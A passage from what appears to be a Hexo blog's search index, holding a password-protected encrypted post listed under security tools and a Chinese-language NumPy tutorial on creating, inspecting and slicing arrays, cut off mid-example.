3e03de6fbb9e1066dab8b8d8eff15b7671418dc2eb17c189efa13baa61e0f993fd8802740e0ae54ee37f5ce8a8a02905ee75b6f3b4e8bf35fd388e7b586cfc6485be5a0af748bbd5c697f5b142d08da3510aa1fd4aa92b06269237610d1d3b8323606b9b561af1e83bfd571f8afc454ff7c12277ad375e703f32f855f08e016269446ffaf1608df084e813d761bd228ce03f9a60c10f764a0e614025c08188b54059430c7f813a10b84be4ae202284b677ab860fdb6f038cb5628ac8b5c4002fe882fff01e63a8d0bdafa0743e797e358ca72e460394e1127a528c6e7892acf347509f07aa2995dc5f1d58665438fb27f70d0d753834dede27e691901b6074bbc2f291b2ba144bdac0fb6cbdefedb0e7c25f8518e20dfb4265b793c14b9cea8a487c6bdfebe399e1636748001b6c1180c29d520770ffea37b40aa24dd6bd1bebc91f33d105168677966ff673d51153c270852dd609ae5fed28341fc5f71a11215540480bd394ac8099d5ca930200bafedb5c69d25e25c0972c5f4b48e332c5d0d78c2af3b59f3ac1117dc2b7a43623d86639348cd4ab0f804682862a9e68a3444c0d20fd9771d840cba3b80665a00d8290c1094a0ffbcfa540713005bf98cd473d174d62ca9662a9efaecb19945a3090bf5908186cd91a93126d54da7623adde428a1a53de01a265944c13c350c9d24fa2357d1ef16ce906527091bf5297ad05c4d9ac8705c8a44664b75857c37e9d223ccbefdb9e679b115f5afe60813200f61c2fda1f77d6aa4b761500fb53d60f52936fdec06522a0332a8fad4eb5866393eb3467ec4529e1f9cda59b33a2551565b49f3d339d9721cc0cc4868a5501aca74708343cb52e4ed0e3b93a3c8b7103e1035c5a824a8c743131b05756317aabe822c8746cf2b767d558af96f0a25ec135282304fde9c66772330e363551eaaa0cc6a0691032f9137ba2045be7cbd61d626875582c2079d3f274b67cc6c368dd525ade2cb4b129de182b7cadccfab94fcd0ebd84aa779a34e00b8e2bae464588a738301c5b26cb93d6e8a587f0a2db17527bfa9524ab99f2b2070441f1ca893a3a88db2974c392673b2b1c02bdc5281a409c0f358ed8c74b176f6bf0c717916aea934fbbd66037979590b78636bcace95621279eeef7231226da7bc4232826f0c4fa974f5fa2dba83f3bd0430bdd73644ca8b2326848e339a141292dfb0a31083c6ffdf6a6c43123c6ccec8d6bd116f1369a5b45158b4f691bc8dc6ec66ea241c0b92cabce1647eab336dd92fc29e534e063ff25652e48a461d741adc10fe2624a85df35c2bab507d7ec93a03ba6875e50c576e153044be0167fb68a6a72a0ea21922ce3ad315308f2e8fc0eefa81c38c7ad9f9646133735b1c369e66161cef443e5266947d363050c084645446ac611728c9ecf2e2c4d27b9f2988e5602b6ad5af89c99656439abcda07bab7e76feeeb60fa5b850b1701f30b5249dde1f7a1ff34b90a48ca32420d1bf093ea6481ad9747831e9eef3ac8039e3c7dfb32b4a8f1f8f5b0ba681f40bd2c566a9a98d89ef1d2327872900b3b4cb4b1527d0936879e64ff4ba68c3f88f84bb812c0091804d3287c7cc0a554b38b89189057deed0e34b2aa47d99a7de886d52907ff106322fc823a051e939611f67252af5b70b576f87e63a7dc26fab81efcb0a49953a5a4b2ef1f4aad163256dacd9eda1e473da1a5d57123b3d6c6e5a6b90987eed81e5afc0359814f77ad215902273f4cbc06019619e6b2312a19b796a5b846dc4ae2f493ff9f44ecf42fa6da3e65d9ca180b2c09b10e2111560e83ea43dfb0b23e5856c525fc4e41ed2bb5b3306a5a241fb1ae4d5e9f564575aa9efb8792e476b69d9643ced9cdd5bc200a10862308f9d0dbfc55d8c6dc77c5d5246120b8c9e784ddf93aa5421970ed6bcd4a0e9cc3d1ccc6ee0b80ed106d8fd1ed057e2ae12ac156bb58f0d6230e4456c2f060a12e8496ad8315b0ce722f83b13863baf431bd2fe5e0b23da0bed915a6bf7c03a27a07b3bf55b2cf85c88071465143fc0d4990241744f35134ed2fc9b2dec9d5a685c00e9248b36328755085e350a5941d03895dc7d250510df3abe210feecc55e63643ef7f746767fcbaa078c36a1af7a90af5a1e65d4a7985fd8d9704d2042de87fc9de42673a3093497bc54db71df312fdf64c6b81e750f3953b116993b2c5271c3d8b7bf58bf264c19053636c015d45ee17189397fb248ddb3e8f73c6876024321d18d62e39ff2b587085bbaadd663e3b858494e706efc2c50dc5dd43c11784b11749d6b5f5373cef4a59dd33158e26e4a0fbf133fb1beeabe447112cd99d4df2eba66e0af9609fe17522238079f3f0f1ff6880408dc9576f6d1c067aca4420c3720843026bc42a2858b8fa1b147d09e135f948e185b70f1f5cf4fdd2e9529e64a9c59f4ec95b050f335d222f360712c119b328447c50c209edc33d524a7df32d082f470f19fe8acb7627618b4d2d11317d413867648c6c1caae5c20aba0e080bed8592fdbed04baebc666712c3a4e6c828b029f46bf8c5e02218ed6b8705871121e587b3db8f879c16fc34e2edefc2903418431784bb0ea39c2738b33ab247175c86de7b64c0a51832ffa39deb0afaa72c56aed3df2705908707524ff6f413121ca8e6f7a3c151f84c5f85c25dfce39cd5ec254378d6a50112097cf0645462a7e5dabc0d8896799f054efd8e330cd12faf5148a17f951f443fca176bcff3c47f65e20cccd29a193afc39b784e0ddfce5fc945a47084829fc9c5d3b2a61c0ec2becf5323975fe735fa78655ad18193ac7f8f802d7091f1390b798317fdf79e875f3434d8fa3702d7a9b900ee4f5afc6a83beaba1be8065c05551924906bc91f1f3308dd455c342812b03772b41ffeebf88567c22b3ce65367c38c30a555cee5961748bb7f37e62353f6aa2853233ac8f84ad315a82c9273322c9be873ef054f4c390ce324fa6a55d1c2a9ae5bb2d504e74ba8f2d22cdd273733b4e52d4538ace5696dbddacc31463abc967a817629062c22b4adc76ac565cef1fd2ee407bdc76d51c87750b57635b3dd518981484d03ea20128d4ccdb7c11cefd2b0bff3d349b985c83185c21a8bcc6b7595a20394a3eaf8ce64b4b14af3287c94e4eeb8835e2b7ef398686a29c2afa5c9c55d6a6599168c5b935e6c6961471880e5081bb4544e441fb0bb3ab5080b7926950dc2ab0519db904ed66dc2311300ee1bcebc319c440db289fab0d08a37dcdd91f6a1c875e738000423390af74b6e232a54620877fdc7dcbdba12024a2171f868df11ad599d3c213b6f506b64debb2d5fa9c18d82384dddb7f70bfdf5c6781238a06fa0853da75f355028ec367a2c2420aeeb517b4e5ea1a35ac8332af790b94e2a5bcd7f33187972cbd42a520d9701b91abec4844e7f8d659df943f90651406a41ed4add9b72ded640beb949c317d11657401ce9ecd9c2a782f597388b918ccc6994899ad7c48a5e753293538c65d5d5fd9e1e3dbbbf4f06a446a026eeef35d920ce5bb1f26177d6bdb5c6184999b3a1f357cf4e203271cb67114619b2b2662a87f77dd59e623c28b97610859289514ecb1ace93bf8753886e21133d8d5eaf7605e843cb78ff74165c45a4b75cfdf70a07748c9d100b5499d8de0abddb5af54094a598d6790eb9b936699c019a2f022339743d0f7c01740b2da1fb5a8d8c890ea0cf28703943e36d18c76c10e4fc7e8321033f72b544952f1d8af089125540351bb3edd7b69a528e3ffaee694a8f5bcc3de4d18159d44e9e8e789df30f0eb3520f92e3151f20b04a813d1029fbed742e33f1208cf693dac03c230aa04851386b1977da585b3d9c48b130f0fca5cf121220dac5ec2541008e2745574daae990e26b2e9c5630c2ac2c0e0050510d4f82667c5d9f7e217f565ec308f128f584290c4181ff15b4ef1bf80916161eb5581f8bf2f24c6ebce9c72156f447d2a0d9602aa01a8f746aee1774f948d7b0ac6388608eeb74cf5341b7c24119e87ae28d855f3dac17d55e5eea40d63b2292854c695aeba7f3c81408354866a5fa7fa2e25546e94aa24a4e366b0af6b6a03036a62ea7c7c2478b79655bf9bb58f121508e891509b4b196234cd8b76960a957878c5805140dae7209ad527a2cd49d3fe57a5859b3fe37c743f2615d6eeca4f3b5571fae8150b52797265ef322c84138d9282fb1b4388b01b41ed7d28f2fee9fd9d6454b6582676e7f5d4ee9792793fa0890d4e180bbabab590d2d100fee28eb29251bcd8731525696f2c533331d47842656991434052657040a14358fbf730c80a16b379b4fb7c62437d386c5786cbb1d9721b0e56c52d3158fa94cec4bf28d5c2999768717d855b253adcb031394c5a728f05b57dbe4e632c504ee3f4b545a9cb9c67c34edc86b608c57a1a4f850de27f5c5236d3d325940e3bb415ea3993940af5d1ca2dfc6360f4d35be6824e243d87eb82466be55ec1c72c54748b272c73727c06b5f61da40b920a7688010efebe8339318b25be7bd89c31a908442a0a3b2bb91e36d77e6848dcf3ce01d3c9361e869d27a5e8164a42d6e14d9888b53372761545afd87c9c6a0a04762f1b97c7bbc5b3445de48d2c26fb0cc3f1f77f4542183523be12727e769ac847e2b02d9b0203646e4a35f19e97b97fa48b5ec13f3e36a23765a5ece5de71c5791fee7af6e36f83ba14d98ee2a76f0f3fe9eeec38bf6dd952510017c4b5eccc23a77f720e064a8fa64f19d93be86882752a14dcbf1dbcbb5e7c4464da8cc26c83f0ce1e015c903e9a916ff3a143fc0264fa166697082e47ca282fa1e41fb4608747a42d68755ef5dd4188c0f8d3bd4c830c201a5cb83932a7e8ff0e72d2f1e23452b4a4365abe45a5f7b0693c256fab18a3d186c74c7d8cd4e24f098d2c4f3576b95fdf606ab8d291792fbd38793652e4f4a524fd992ecb626da050a33df01e0c57a8ec40f247be87d4efe56b03d7137c90c6421f2c2180567afd296b795e26b6a0abfd7c0057262dba23bcc872a73df168d7ca7868b1a1b56ebef46e2accfbc3a3c854805413df541fa4d36779b54ba9f89bd032fdcb078325288a0645fac1b42a0e9e0c2b37232a56700ba0868cf9f117b451762c78ff9a5b1d5e85dfb16752e6df86b438af3cb5b7ca1c380be69064941d8c129a637852f3848cf552de99a856ac6226ba8318b0e81c476a3a6a7fd42cabb19df2dafc2b16965d58956c9a74aa311fe0e6d69a199f9962e7dcb88217ede987da53452bdcf4bfac5468dd05d7aeb88e1a14087b688def48f2e415a12f2a7bdb83c8a952760a434e3be021b5d97492bdf7f99c58a64ef86ea20c27360e2a1c3defd2c1a8cc063be95bbd5bb1e0549c26d5a23c1b62fbbe4309a332d928edd3214eb6a39941c36db73d5e75f909a4d517b9bcdca686c4bee965d2326ee4f73445b6f97f81a4e8b2a0f2ef6cdaa91e53f8b9eac1594321967da5adb7bc7b180aa819060f73f21cfa2e24494652ec918a8be773c73a29821804f070fab4d99da116ccdb1f607a90f1e1f18d0e349539c901caa21fed9522246cdc5e92968cb3a9f11a42b10ee673cdf0cc979b9fd55dde778c8eab593340b534d20d6c29f534987be2335c6fe65251de6ff778d166e284013e3f908cb721703cb8a4bc14360d3e6eb9a4a980b6953dddcb6f1cc5018f02177c562834ebbe5ef1c8d31f1a767e5c5506146aef0b627afdcfb8abab2bc6e4745aa3714c7eacd8a0391e5dab56f01594bf8dabb3aec84e2310dd3b491efe9e5f5ee553e26904cce4fa873c4c4d9ec68597916884702b0827df2a3a3eac0761b2f97452d53eebd92ac01206b2fe8540bad5c8e52664a814aa3a110d95f979537f79bfa27b96d92e1d2b5d4849feb415ff036bae9f0cb4042818a1ec71fd465cbb128ea315a2e44a31384a4db16e0b4b43876b17002259c5bc8f0d63c45892447116d0f2ccea38ffb96a1e64b1a5d048f72a6b5d1505b55afbad11a4a9da2ee13172259b9d621fb1d9f8f1bc6c02a4c3722d729cd93841a3e64b7fb107ac3e4375068b3a81337f49582cb25f707808f3b346e8ecb282327ac6d8078c9101e5ca1c76d2fdcace58d3780afde6d944a2ee3eacaebb515cfbb55f3cad2dc652c11919f76a8fa91acafdd2679113afc7d2b5cb70b6262cdc3486e09fb1fb37a93d69c96f4446135a8d9f035ac7b05148bc9396ae388d1709d8d105d4f11f9176bc61202bfd314fedab352ddbba59f11cbe560309a8a530ce27b74dfcf2fd8bf1b36db2d4be1c9104c02520388e9cb891d13e4fc0a60847eef47c0f0f32ea41d7cb0292ddff910c7213628f8c1c75c7f10a4860c978057d2fa1d631ab04d7131f2160d53ce0e2309d2777811bbb7f151a1de063d28119ac715123fa6b44386b5521df6d0e316b7b9da9f19e982d6fd8a8d9f369baf6ab7b174941d151e456249326b8af5f43d64b35f8455c0c889ef73d3fc25746847d80071ef3ef4a2976d9a7c1a472e8b720af6fa84ea60ab96658be027c41e83177942cb8beb9777cc3c45501d0145bdabecf282e193be1a246dc29b0ba47f724ddfe2e0f82fb1b8e105ba9bd23f37ad4f989a80a94fe5a5e462d3b60193eb098755824e3f74352081c97c3a233b4af59ec691ebe6896bc6ede92b54c7831ba5c5387e8760313314b3f4489c5e372af5b6b59dd3a368231a4a466fc3ff712195222ee6fbd972b46f5fad6ee78414c0546bd8ae87914b637f40d630c70822f03b3235ee428ad714da6678cc5b3d5357c41f81def686e68cffe0a4d066d8f06d75b87f7731c0a095d771da32a52f328e81eb344acebe5fbe7c7177086b8aa05a1e516c1732ae7516187f4821521916b1e1f610d3d8fa1d002ae9879bfdede84e6a8fc67a7ce31c1f1f1a34c99ab781ae534a31493e74694ade99360122911138496c3c96ef80e17af448240ed9021e7c1c502fd59b01e31ffbd2385fa140e7e8f41a34a36a69df33d1ad385c5527636ac8745b056bb48c1e14ba1fe9777fff7a7f24bfa2470e19346e4005d748d3bb15f90ca88e2cb2e81e57b047bf0a2194529ae15012ad513dcb3ce3b06c2146ff81a0518b76dabf00462b2e6a1bd0934102f7d3c647bfecd225762b51edab6b6258fe558d247b043840d4d25ea0b0a769749fdfbdd65b557abd1d32750f90f64cc67098cb1088ae5ae22ab0667efcb9e414264d1d8934bb050ddc036583615f3626d4c4fc9e640b76028553959af922b30682b7ee7bbd6313ea285757ad7e92b696b409a31af8a3b7977c9eb2a71510dda512ec68d0e8a9f4e30946af8e46d2bc35eef36447676234c72220b580b815d6db7dcaa78cdf5c83bf31d119dc944fb955022044ba07b83029fe59fa2892482c6167023ae7ca9fcda8c5b9496f24617ce3dd921595d87b4825736d180619d7aff370a17aa35aeb7932d1afd2dfd31b2c61e2ac2ae4cac1561ac60f14198c82a8007897b961b12f42fa8a912ec49672cd9ab4507fd6cc84658ab95b0ae847ff39d15013ebf15ed136ab36ebb8d85750aea8260fdc0b91ae4f06b969ecbdd19bd8a5d0ae298a406cecb402b38b4fc75391456123467ea7c1b22ef46150284d8f66a85a829cc1bc25291bd7bb86275d103f55889b2b40cd76f4f2c7d996c01a2c6108a85e2c695945173a776a6ffda960a33e6e31cbd6e926fb3ebf8befee30c3720ae15fcb02cfccf9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Numpy学习</title>
      <link href="/p/6c51f6e8.html"/>
      <url>/p/6c51f6e8.html</url>
      
        <content type="html"><![CDATA[<p>NumPy（Numerical Python）是Python的一种开源的数值计算扩展。这种工具可用来存储和处理大型矩阵，比Python自身的嵌套列表（nested list structure)结构要高效的多（该结构也可以用来表示矩阵（matrix）），支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。</p><p>以下记录自己学习NumPy的笔记。</p><h1 id="numpy-array基础"><a href="#numpy-array基础" class="headerlink" title="numpy.array基础"></a>numpy.array基础</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment">##查看版本</span></span><br><span class="line">np.__version__</span><br></pre></td></tr></table></figure><h2 id="python-list的特点"><a href="#python-list的特点" class="headerlink" title="python list的特点"></a>python list的特点</h2><p><strong>不对类型做具体的限定</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">L = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">L --&gt; [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line">L[<span class="number">5</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">L --&gt; [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="string">&#x27;test&#x27;</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure><blockquote><p>python中限定只能存储一种类型的数组如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> array</span><br><span class="line">arr = array.array(<span class="string">&#x27;i&#x27;</span>, [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line">arr --&gt; array(<span class="string">&#x27;i&#x27;</span>, [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br></pre></td></tr></table></figure><h2 id="numpy-array"><a href="#numpy-array" class="headerlink" title="numpy.array"></a>numpy.array</h2><p>基础操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列表初始化</span></span><br><span class="line">nparr = np.array([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">10</span>)])</span><br><span class="line">npar --&gt; array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br><span class="line"><span class="comment"># 查看存储类型</span></span><br><span class="line">nparr.dtype --&gt; dtype(<span class="string">&#x27;int32&#x27;</span>)</span><br><span class="line">nparr[<span class="number">5</span>] = <span class="number">10.5</span></span><br><span class="line">nparr --&gt; array([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>])</span><br></pre></td></tr></table></figure><blockquote><p>int定义浮点会自动去位</p></blockquote><h3 id="创建0数组或0矩阵"><a href="#创建0数组或0矩阵" class="headerlink" title="创建0数组或0矩阵"></a>创建0数组或0矩阵</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">np.zeros(<span class="number">10</span>).dtype</span><br><span class="line">--&gt; array([<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]) --&gt; dtype(<span class="string">&#x27;float64&#x27;</span>)</span><br><span class="line">np.zeros(<span class="number">10</span>, dtype=<span class="built_in">int</span>)</span><br><span class="line"><span class="comment">## 创建全为0矩阵</span></span><br><span class="line">np.zeros((<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">array([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]])</span><br><span class="line"><span class="comment">## 创建全为1矩阵</span></span><br><span class="line">np.ones(shape=(<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>]])</span><br></pre></td></tr></table></figure><h3 id="创建指定数字的矩阵"><a href="#创建指定数字的矩阵" class="headerlink" title="创建指定数字的矩阵"></a>创建指定数字的矩阵</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">np.full(shape=(<span class="number">3</span>, <span class="number">5</span>), fill_value=<span class="number">666.</span>)</span><br><span class="line">array([[<span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>],</span><br><span class="line">       [<span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>],</span><br><span class="line">       [<span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>]]</span><br></pre></td></tr></table></figure><h2 id="arange-调用list创建矩阵"><a href="#arange-调用list创建矩阵" class="headerlink" title="arange 调用list创建矩阵"></a>arange 调用list创建矩阵</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure><blockquote><p>起始，终止（左闭右开），步长</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.arange(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0.2</span>) </span><br><span class="line">--&gt; array([<span class="number">0.</span> , <span class="number">0.2</span>, <span class="number">0.4</span>, <span class="number">0.6</span>, <span class="number">0.8</span>])</span><br></pre></td></tr></table></figure><h2 id="linspace-在范围内（包含前后），截取x个数"><a href="#linspace-在范围内（包含前后），截取x个数" class="headerlink" title="linspace 在范围内（包含前后），截取x个数"></a>linspace 在范围内（包含前后），截取x个数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.linspace(<span class="number">0</span>, <span class="number">20</span>, <span class="number">10</span>)</span><br><span class="line">--&gt; array([ <span class="number">0.</span>        ,  <span class="number">2.22222222</span>,  <span class="number">4.44444444</span>,  <span class="number">6.66666667</span>,  <span class="number">8.88888889</span>,</span><br><span class="line">       <span class="number">11.11111111</span>, <span class="number">13.33333333</span>, <span class="number">15.55555556</span>, <span class="number">17.77777778</span>, <span class="number">20.</span>        ])</span><br></pre></td></tr></table></figure><h2 id="生成随机数（左闭右开）"><a href="#生成随机数（左闭右开）" class="headerlink" title="生成随机数（左闭右开）"></a>生成随机数（左闭右开）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">np.random.randint(<span class="number">4</span>, <span class="number">8</span>, <span class="number">10</span>)</span><br><span class="line">--&gt; array([<span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">4</span>])</span><br><span class="line"><span class="comment">## 随机矩阵</span></span><br><span class="line">np.random.randint(<span class="number">4</span>, <span class="number">8</span>, size=(<span class="number">3</span>,<span class="number">5</span>))</span><br></pre></td></tr></table></figure><p>指定随机种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">np.random.seed(<span class="number">666</span>) </span><br><span class="line">np.random.randint(<span class="number">4</span>, <span class="number">8</span>, size=<span class="number">10</span>)</span><br><span class="line">--&gt; array([<span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">np.random.seed(<span class="number">666</span>)</span><br><span class="line">np.random.randint(<span class="number">4</span>, <span class="number">8</span>, size=<span class="number">10</span>)</span><br><span class="line">--&gt; array([<span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br></pre></td></tr></table></figure><p>随机浮点数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.random.random((<span class="number">3</span>,<span class="number">5</span>))</span><br></pre></td></tr></table></figure><p>符合正态分布的随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.random.normal()</span><br></pre></td></tr></table></figure><h2 id="数组的基本属性"><a href="#数组的基本属性" class="headerlink" title="数组的基本属性"></a>数组的基本属性</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X = np.arange(<span class="number">15</span>).reshape(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>]])</span><br></pre></td></tr></table></figure><h3 id="查看数组维度"><a href="#查看数组维度" class="headerlink" title="查看数组维度"></a>查看数组维度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X.ndim --&gt; <span class="number">2</span></span><br><span class="line">X.shape --&gt; (<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">X.size --&gt; <span class="number">15</span></span><br></pre></td></tr></table></figure><h3 id="数组读取数据"><a href="#数组读取数据" class="headerlink" title="数组读取数据"></a>数组读取数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">X[<span class="number">2</span>,<span class="number">2</span>] --&gt; <span class="number">12</span></span><br><span class="line">X[:<span class="number">2</span>, :<span class="number">3</span>] <span class="comment">##前两行前三列</span></span><br><span class="line">--&gt; array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">       [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]])</span><br><span class="line">X[::-<span class="number">1</span>] --&gt; <span class="comment">## 倒行</span></span><br><span class="line">array([[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>],</span><br><span class="line">       [ <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">       [ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>]])</span><br><span class="line">X[::, ::-<span class="number">1</span>] --&gt; <span class="comment">##倒列</span></span><br><span class="line">array([[ <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>,  <span class="number">1</span>,  <span class="number">0</span>],</span><br><span class="line">       [ <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">5</span>],</span><br><span class="line">       [<span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>]])</span><br><span class="line">X[::-<span class="number">1</span>, ::-<span class="number">1</span>] --&gt; <span class="comment">##行列都倒</span></span><br><span class="line">array([[<span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>],</span><br><span class="line">       [ <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">5</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>,  <span class="number">1</span>,  